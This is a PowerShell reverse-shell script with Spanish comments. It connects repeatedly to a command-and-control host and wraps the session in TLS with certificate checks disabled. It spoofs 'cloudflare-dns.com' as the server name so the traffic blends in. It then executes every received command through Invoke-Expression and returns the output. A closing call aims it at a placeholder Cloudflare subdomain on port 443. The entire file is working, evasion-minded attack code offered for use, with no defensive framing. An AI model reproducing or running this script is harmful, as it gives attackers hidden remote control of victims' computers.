function GetShell {
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(Position=0, Mandatory=$true, ParameterSetName="reverse")]
        [String]$IPAddress,
        [Parameter(Position=1, Mandatory=$true, ParameterSetName="reverse")]
        [Int]$Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]$Reverse
    )
    do {
        Start-Sleep -Seconds 1
        try {
            $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, $Port)
        } catch {
            Write-Warning "Error de conexión. Reintentando..."
        }
    } until ($TCPClient.Connected)
    
    $streamNet = $TCPClient.GetStream()
    $streamSecure = New-Object Net.Security.SslStream($streamNet, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
    $streamSecure.AuthenticateAsClient('cloudflare-dns.com', $null, $false)
    
    if(!$streamSecure.IsEncrypted -or !$streamSecure.IsSigned) {
        $streamSecure.Close()
        exit
    }
    
    $StreamWriter = New-Object IO.StreamWriter($streamSecure)
    $Buffer = New-Object Byte[] 1024
    
    while(($BytesRead = $streamSecure.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $userInput = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
        if ($userInput -eq 'exit') {
            $streamSecure.Close()
            exit
        }
        if($userInput -ne $null) {
            $Output = try {
                Invoke-Expression $userInput 2>&1 | Out-String
            } catch {
                $_ | Out-String
            }
            $sendBytes = ([text.encoding]::UTF8).GetBytes($Output + 'PS> ')
            $streamSecure.Write($sendBytes, 0, $sendBytes.Length)
            $streamSecure.Flush()
        }
    }
    $StreamWriter.Close()
}

# Reemplazar con la IP/puerto de tu servidor C2 o subdominio Cloudflare
GetShell -Reverse -IPAddress "SUBDOMINIO.cloudflare.com" -Port 443
